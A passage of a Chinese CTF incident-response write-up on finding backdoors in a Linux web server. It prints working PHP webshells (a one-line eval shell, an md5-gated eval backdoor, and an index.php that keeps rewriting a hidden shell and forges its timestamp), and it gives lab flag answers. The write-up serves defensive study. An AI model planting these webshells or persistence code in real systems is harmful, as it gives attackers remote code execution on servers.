class="variable">$dbit</span>-&gt;<span class="title function_ invoke__">getlist</span>(TB.<span class="string">&quot;cms&quot;</span>,<span class="string">&quot;status=1 and cat=&quot;</span>.<span class="variable">$cat</span>,<span class="string">&quot;count(*)&quot;</span>);</span><br><span class="line">                <span class="variable">$total</span>=<span class="variable">$totaldata</span>[<span class="number">0</span>][<span class="string">&#x27;count(*)&#x27;</span>];</span><br><span class="line">                <span class="variable">$addtail</span>=<span class="string">&quot;&amp;cat=&quot;</span>.<span class="variable">$cat</span>;</span><br><span class="line">                <span class="variable">$indexs</span>=<span class="string">&#x27;wap_index&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$uppage</span>=<span class="variable">$page</span>&gt;<span class="number">0</span>?<span class="variable">$page</span>-<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">        <span class="variable">$downpage</span>=(<span class="variable">$page</span>+<span class="number">1</span>)*<span class="variable">$eachpage</span>&lt;<span class="variable">$total</span>?<span class="variable">$page</span>+<span class="number">1</span>:<span class="variable">$page</span>;</span><br><span class="line">        <span class="variable">$o</span>=<span class="variable">$dbit</span>-&gt;<span class="title function_ invoke__">getlist</span>(TB.<span class="string">&quot;cms&quot;</span>,<span class="string">&quot;status=1 and &quot;</span>.(<span class="variable">$cat</span>?<span class="string">&quot;cat=&quot;</span>.<span class="variable">$cat</span>:<span class="string">&quot;1=1&quot;</span>),<span class="string">&quot;*&quot;</span>,<span class="variable">$eachpage</span>*<span class="variable">$page</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$eachpage</span>,<span class="string">&quot;orders DESC,id DESC&quot;</span>);</span><br><span class="line">        <span class="variable">$catinfo</span>=<span class="variable">$dbit</span>-&gt;<span class="title function_ invoke__">getlist</span>(TB.<span class="string">&quot;category&quot;</span>,<span class="string">&quot;status=1 and id=&quot;</span>.<span class="variable">$cat</span>);</span><br><span class="line">        <span class="variable">$addtitle</span>=<span class="variable">$catinfo</span>[<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>]?<span class="variable">$catinfo</span>[<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;_&quot;</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//模板生效</span></span><br><span class="line">        <span class="variable">$tpl</span> = <span class="keyword">new</span> <span class="title class_">Template</span>();</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$tpl</span>-&gt;<span class="title function_ invoke__">myTpl</span>(<span class="variable">$indexs</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;$tpl&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>可以发现top.php文件是一个高度混淆的webshell代码，进行了base64编码和异或的解密，并通过动态拼接构造危险函数，例如下面的传参</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421152448652.png" alt="image-20250421152448652"></p>
<p>我们顺着代码解密一下</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421152700245.png" alt="image-20250421152700245"></p>
<p>可以看到这里构造了一个phpinfo()函数；最后结合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a = &quot;a&quot;;</span><br><span class="line">$s = &quot;s&quot;;</span><br><span class="line">$c=$a.$s.$_GET[&quot;func2&quot;];</span><br><span class="line">$c($fun);</span><br><span class="line">//传参func2=sert</span><br><span class="line">构造出assert(phpinfo());</span><br></pre></td></tr></table></figure>

<p>很明显就是在尝试执行phpinfo()函数了</p>
<p>通过对日志文件的排查，最终可以确定top.php文件是恶意文件</p>
<p>不过还有一种方法比较有运气成分，我猜测免杀马用的是base64编码加密，所以我直接手动搜索</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name &quot;*.php&quot; | xargs grep &quot;base64_decode&quot;</span><br></pre></td></tr></table></figure>

<p>这里在<code>/var/www/html/wap/top.php</code>中找到了 Base64 加密方法 </p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421152900317.png" alt="image-20250421152900317"></p>
<h6 id="为什么可以确认是恶意文件？"><a href="#为什么可以确认是恶意文件？" class="headerlink" title="为什么可以确认是恶意文件？"></a>为什么可以确认是恶意文件？</h6><ul>
<li>混淆和隐藏：</li>
</ul>
<p>使用Base64编码和字符异或操作来混淆代码。这些技术通常用于隐藏恶意代码，避免被直接检测到。</p>
<ul>
<li>动态执行：</li>
</ul>
<p>动态生成并调用函数。这种模式允许攻击者通过URL参数传递任意代码并在服务器上执行，具有极大的危险性。</p>
<ul>
<li>外部输入：</li>
</ul>
<p>使用$_GET参数来控制代码行为。通过外部输入来决定代码逻辑，使得攻击者可以远程控制服务器，执行任意PHP代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;</span><br></pre></td></tr></table></figure>

<h3 id="第一章-应急响应-Linux入侵排查"><a href="#第一章-应急响应-Linux入侵排查" class="headerlink" title="第一章 应急响应- Linux入侵排查"></a>第一章 应急响应- Linux入侵排查</h3><h4 id="什么是木马"><a href="#什么是木马" class="headerlink" title="什么是木马?"></a>什么是木马?</h4><p><strong>木马（Trojan Horse）</strong> 是一种伪装成合法软件的恶意程序，其目的是为攻击者提供对受感染机器的远程访问。</p>
<p>特点：</p>
<ul>
<li><strong>伪装性</strong>：通常捆绑或伪装成合法应用程序。</li>
<li><strong>后门功能</strong>：允许攻击者对系统进行远程控制。</li>
<li><strong>多功能性</strong>：可以包括键盘记录、屏幕截图、文件传输、权限提升等功能。</li>
<li><strong>持续性</strong>：常常设法在系统重启后继续运行。</li>
</ul>
<h4 id="检测："><a href="#检测：" class="headerlink" title="检测："></a>检测：</h4><h4 id="什么是linux入侵排查"><a href="#什么是linux入侵排查" class="headerlink" title="什么是linux入侵排查"></a>什么是linux入侵排查</h4><p><strong>Linux入侵排查</strong>是应急响应的一部分，专门针对Linux系统进行安全事件的调查和分析。</p>
<p>具体的排查方法我就不赘述了，上面两次也写过了</p>
<h4 id="两种方法的好处"><a href="#两种方法的好处" class="headerlink" title="两种方法的好处"></a>两种方法的好处</h4><p>1.手工排查的好处</p>
<ul>
<li>灵活性高：</li>
</ul>
<p>手工排查能够根据具体情况和需求进行灵活调整，针对特定的可疑活动进行详细分析。</p>
<ul>
<li>深度理解：</li>
</ul>
<p>手工排查需要深入理解系统和日志，这有助于安全人员提高对系统和安全事件的理解和认识。</p>
<ul>
<li>精确性强：</li>
</ul>
<p>手工排查可以通过逐行分析日志和系统信息，发现工具可能遗漏的细微线索和异常行为。</p>
<ul>
<li>适应性强：</li>
</ul>
<p>对于新型威胁和未知攻击，手工排查可以快速调整策略进行应对，而不需要依赖工具的更新和支持。<br>2.工具排查的好处</p>
<ul>
<li>效率高：</li>
</ul>
<p>工具可以快速处理大量数据和日志，节省时间，提高分析效率。</p>
<ul>
<li>全面性：</li>
</ul>
<p>工具能够自动化地扫描和分析系统的各个方面，提供全面的检测和报告。</p>
<ul>
<li>重复性强：</li>
</ul>
<p>工具可以进行重复性工作，减少人为错误和疏漏，提高一致性和准确性。</p>
<ul>
<li>集成性好：</li>
</ul>
<p>现代安全工具通常集成了多种功能，如日志分析、恶意软件检测、漏洞扫描等，提供一站式解决方案。</p>
<h4 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h4><h5 id="问题1-web目录存在木马，请找到木马的密码提交"><a href="#问题1-web目录存在木马，请找到木马的密码提交" class="headerlink" title="问题1:web目录存在木马，请找到木马的密码提交"></a>问题1:web目录存在木马，请找到木马的密码提交</h5><p>需要我们找到这个木马并把木马的密码提交</p>
<p>因为是web目录的，那还是在&#x2F;var&#x2F;www&#x2F;html目录下</p>
<p>先进入&#x2F;var&#x2F;www&#x2F;html目录查看木马，跟上面的基本查看webshell是一样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name &quot;*.php&quot; | xargs grep &quot;eval(&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421155238313.png" alt="image-20250421155238313"></p>
<p>可以看出查出三个后缀为.php的文件，题目要求我们把木马的密码提交，就这三个文件很明显嘛，不是pass就是1咯，我们挨个看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这是最经典的一句话木马</p>
<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>一句话木马是一种极为简短且隐蔽的恶意代码，通常嵌入到网站的 PHP 文件中，用于远程执行任意代码或命令。这种木马之所以被称为“一句话木马”，是因为它们通常只包含一行代码，但功能强大且危险。</p>
<p>一句话木马特征</p>
<ul>
<li>简短：通常只有一行代码，易于隐藏和注入。</li>
<li>使用 eval 函数：利用 eval 函数执行传入的 PHP 代码。</li>
<li>通过 HTTP 参数传递代码：常见的方式是通过 GET 或 POST 请求参数传递要执行的代码。</li>
<li>基础验证：一些一句话木马会有简单的验证机制，比如检查一个参数的值是否符合某个条件。</li>
</ul>
<p>可以看到1.php中木马的密码是1，直接提交flag就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1&#125;</span><br></pre></td></tr></table></figure>

<p>我们再看看其他两个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>])==<span class="string">&quot;5d41402abc4b2a76b9719d911017c592&quot;</span>)&#123;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(SYS_ROOT.INC.<span class="string">&#x27;common.php&#x27;</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>].(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]?<span class="string">&#x27;?&#x27;</span>.<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]):<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$path</span>, <span class="number">0</span>,<span class="number">1</span>)==<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$path</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$path</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$path</span> = <span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$ctrl</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]:<span class="string">&#x27;run&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;createprocess&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="title class_">Index</span>::<span class="title function_ invoke__">createhtml</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="number">0</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;single&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title class_">Index</span>::<span class="title function_ invoke__">run</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/var/www/html/.shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个是关于不死马的代码，下面会具体分析</p>
<h5 id="问题2-服务器疑似存在不死马，请找到不死马的密码提交"><a href="#问题2-服务器疑似存在不死马，请找到不死马的密码提交" class="headerlink" title="问题2:服务器疑似存在不死马，请找到不死马的密码提交"></a>问题2:服务器疑似存在不死马，请找到不死马的密码提交</h5><h4 id="什么是不死马"><a href="#什么是不死马" class="headerlink" title="什么是不死马"></a>什么是不死马</h4><p>不死马（Persistence Backdoor）是一种能够在系统中保持长期存在并持续运行的恶意软件，即使系统重启或某些安全措施生效后，它依然能够恢复运行。不死马通常会通过修改系统关键配置、添加定时任务、劫持系统进程等手段来实现持久化。</p>
<p>简单来说；</p>
<p>不死马是一种具有持久性的后门程序，它被设计用来在受感染的系统上长期驻留并保持活跃。其目的是确保攻击者对系统的访问不会因为系统重启或其他干预措施而中断。</p>
<p>不死马特征</p>
<ul>
<li>持久性：</li>
</ul>
<p>自启动：通过修改系统启动项、服务、计划任务等方式实现自启动。</p>
<p>文件隐藏：使用技术手段隐藏自身文件，避免被发现和删除。</p>
<p>多重存在：可能在多个位置部署副本，增强存活能力。</p>
<ul>
<li>隐蔽性：</li>
</ul>
<p>低调运行：以低优先级运行，不占用过多系统资源，减少被注意的可能。</p>
<p>多态性：定期更改自身代码或行为模式，规避签名检测。</p>
<p>日志清除：清除自身操作痕迹，减少被追踪的可能。</p>
<ul>
<li>多样化的保持机制：</li>
</ul>
<p>启动项：在 Windows 中，可以修改注册表中的启动项，在 Linux 中，可以修改 rc.local 或 crontab。<br>服务劫持：创建或劫持合法的系统服务。<br>计划任务：在系统计划任务中添加恶意任务。</p>
<p>因为我们刚刚找到了三个木马，所以我们继续看别的两个木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>])==<span class="string">&quot;5d41402abc4b2a76b9719d911017c592&quot;</span>)&#123;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(SYS_ROOT.INC.<span class="string">&#x27;common.php&#x27;</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>].(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]?<span class="string">&#x27;?&#x27;</span>.<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]):<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$path</span>, <span class="number">0</span>,<span class="number">1</span>)==<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$path</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$path</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$path</span> = <span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$ctrl</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]:<span class="string">&#x27;run&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;createprocess&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="title class_">Index</span>::<span class="title function_ invoke__">createhtml</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="number">0</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;single&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title class_">Index</span>::<span class="title function_ invoke__">run</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/var/www/html/.shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里可以看到index.php中在<code>/var/www/html/</code> 目录下创建一个名为 <code>.shell.php</code> 的后门文件，并伪造其时间戳以试图隐藏其存在。该后门文件包含恶意代码，通过 <code>md5</code> 哈希验证密码后，执行传入的命令。这种后门文件可以被攻击者用来远程执行任意命令，从而完全控制服务器。</p>
<p>代码解释:</p>
<ul>
<li>定义后门文件路径：</li>
</ul>
<p>$file &#x3D; ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;.shell.php’;</p>
<p>$file 变量定义了后门文件的存放路径 &#x2F;var&#x2F;www&#x2F;html&#x2F;.shell.php。</p>
<ul>
<li>定义后门代码：</li>
</ul>
<p>$code &#x3D;<code> &#39;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#39;;</code></p>
<p>$code 变量定义了后门代码。</p>
<p>该代码通过 md5 哈希验证 POST 请求中的密码（pass 参数），如果匹配，则执行 POST 请求中的命令（cmd 参数）。</p>
<ul>
<li>写入后门文件：</li>
</ul>
<p>file_put_contents($file, $code);</p>
<p>使用 file_put_contents 函数将后门代码写入到 $file 指定的文件路径中，即创建或覆盖 .shell.php 文件。</p>
<ul>
<li>伪造文件时间戳：</li>
</ul>
<p>system(‘touch -m -d “2021-01-01 00:00:01” .shell.php’);</p>
<p>使用 system 函数执行 touch 命令，修改 .shell.php 文件的修改时间为 2021-01-01 00:00:01，以伪造文件的修改时间，试图隐藏其创建和修改痕迹。</p>
<ul>
<li>微小延时：</li>
</ul>
<p>usleep(3000);</p>
<p>使用 usleep 函数增加 3000 微秒（3 毫秒）的延时，虽然这个延时很短，但可能用于调节执行的节奏，以掩盖其操作痕迹。</p>
<p>所以这一套下来基本就是可以确认.shell.php文件就是由这个文件生成的，并且每隔usleep(3000)就生成一个新文件，所以达到了不死马的条件；</p>
<p>那既然我们不死马知道是谁了，并且也知道了是由谁生成不死马，那密码肯定就是那串MD5；那我们拿去解密一下就可以拿到flag了</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421160909697.png" alt="image-20250421160909697"></p>
<h5 id="问题3-不死马是通过哪个文件生成的，请提交文件名"><a href="#问题3-不死马是通过哪个文件生成的，请提交文件名" class="headerlink" title="问题3:不死马是通过哪个文件生成的，请提交文件名"></a>问题3:不死马是通过哪个文件生成的，请提交文件名</h5><p>上面就可以看到了不死马是在index.php中进行创建生成的，直接交文件名就行</p>
<h5 id="问题4：黑客留下了木马文件，请找出黑客的服务器ip提交"><a href="#问题4：黑客留下了木马文件，请找出黑客的服务器ip提交" class="headerlink" title="问题4：黑客留下了木马文件，请找出黑客的服务器ip提交"></a>问题4：黑客留下了木马文件，请找出黑客的服务器ip提交</h5><p>我第一个去看了登录日志看看是否有创建用户或者跟用户有关的操作</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421161213790.png" alt="image-20250421161213790"></p>
<p>但是我们这里搜查了两个都没得回显，然后我去看了apache的日志文件，猜测会用POST的方法去上传木马文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1 | grep -a &quot;POST&quot;</span><br></pre></td></tr></table></figure>

<p>也没啥收获</p>
<p>我们只能返回刚刚的目录检查一下可疑文件可以看到有一个<code>‘shell(1).elf’</code></p>
<p>首先我们对这个文件进行提权，使所有用户都能无限制的访问此文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-11:/var/www/html# chmod 777 &#x27;shell(1).elf&#x27;</span><br></pre></td></tr></table></figure>

<p>然后我们运行，让他产生外联行为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-11:/var/www/html# ./&#x27;shell(1).elf&#x27;</span><br></pre></td></tr></table></figure>

<p>但是这个时候我们的终端是会卡住的，需要另外起一个终端并运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></table></figure>

<h4 id="netstat-命令"><a href="#netstat-命令" class="headerlink" title="netstat 命令"></a>netstat 命令</h4><p>netstat 是一个网络工具，用于显示网络连接、路由表、接口统计信息、伪装连接和多播成员信息。</p>
<p>选项和参数</p>
<p>-a：显示所有连接中的端口，包括监听和非监听。<br>-n：以数字形式显示地址和端口号，而不是将其解析为主机名或服务名。<br>-t：显示 TCP 连接。<br>-l：显示监听状态的套接字。<br>-p：显示使用每个套接字的程序。</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421161959689.png" alt="image-20250421161959689"></p>
<p>字段解释</p>
<ul>
<li>Proto：协议（Protocol）</li>
</ul>
<p>显示协议类型，常见的有 tcp 和 udp。</p>
<ul>
<li>Recv-Q：接收队列（Receive Queue）</li>
</ul>
<p>显示接收队列的字节数。接收队列中的字节数是应用程序还未处理的接收数据。</p>
<ul>
<li>Send-Q：发送队列（Send Queue）</li>
</ul>
<p>显示发送队列的字节数。发送队列中的字节数是已经被应用程序发送，但还未被远程主机接收的字节数。</p>
<ul>
<li>Local Address：本地地址</li>
</ul>
<p>显示本地端的 IP 地址和端口号。例如：0.0.0.0:80 表示本地所有 IP 地址上的 80 端口。</p>
<ul>
<li>Foreign Address：远程地址</li>
</ul>
<p>显示远程端的 IP 地址和端口号。例如：192.168.1.1:12345 表示远程 IP 为 192.168.1.1 的 12345 端口。</p>
<ul>
<li>State：状态</li>
</ul>
<p>显示连接的状态。常见状态有：</p>
<p>LISTEN：正在监听连接。</p>
<p>ESTABLISHED：已建立连接。</p>
<p>CLOSE_WAIT：等待关闭连接。</p>
<p>TIME_WAIT：等待足够的时间以确保远程主机收到关闭请求。</p>
<ul>
<li>PID&#x2F;Program name：进程 ID 和程序名</li>
</ul>
<p>显示使用该连接的进程的进程 ID 和程序名。例如：1234&#x2F;nginx 表示进程 ID 为 1234 的 nginx 程序。</p>
<p>然后我们找到.shell.elf文件的那一行就可以看到我们想要的的信息了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;10.11.55.21&#125;</span><br></pre></td></tr></table></figure>

<h5 id="问题5黑客留下了木马文件，请找出黑客服务器开启的监端口提交"><a href="#问题5黑客留下了木马文件，请找出黑客服务器开启的监端口提交" class="headerlink" title="问题5黑客留下了木马文件，请找出黑客服务器开启的监端口提交"></a>问题5黑客留下了木马文件，请找出黑客服务器开启的监端口提交</h5><h4 id="什么是监听端口号？"><a href="#什么是监听端口号？" class="headerlink" title="什么是监听端口号？"></a>什么是监听端口号？</h4><p>监听端口号（Listening Port）是网络通信中用于等待和接收传入连接请求的端口号。服务器或服务在特定端口上监听，以便与客户端建立连接。这种机制确保了网络应用程序能够接收和处理来自其他网络设备的请求。</p>
<p>基本概念</p>
<p>端口号：计算机网络中的端口号是用于标识特定应用程序或进程的逻辑端点。端口号的范围是0到65535，其中0到1023为系统保留端口，一般用于知名服务。<br>监听（Listening）：当一个应用程序或服务在某个端口上“监听”时，它在等待并准备接受来自该端口的连接请求。</p>
<p>从上面的图里面可以看到是3333端口，直接提交就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3333&#125;</span><br></pre></td></tr></table></figure>

<h3 id="工具排查"><a href="#工具排查" class="headerlink" title="工具排查"></a>工具排查</h3><p>由于我们上面的都是自己手动排查，相对来说比较繁琐效率也低，这时候我们可以用工具进行排查，例如河马和d盾，我们直接把文件下载下来然后放d盾或者相关的web查杀工具里进行扫描查看就可以了，这里简单高效</p>
<p>相关命令</p>
<p>下载命令:tar -czvf 目录名字.tar.gz .&#x2F;</p>
<ul>
<li><code>tar</code>: Tape Archive 的缩写，是一个在 Unix 和类 Unix 系统中用于文件归档的工具。它可以将多个文件和目录打包成一个单一的归档文件。</li>
<li><code>-c</code>: 选项表示创建一个新的归档文件（create）。</li>
<li><code>-z</code>: 选项表示通过 <code>gzip</code> 来压缩归档文件。这样可以使生成的归档文件体积更小。</li>
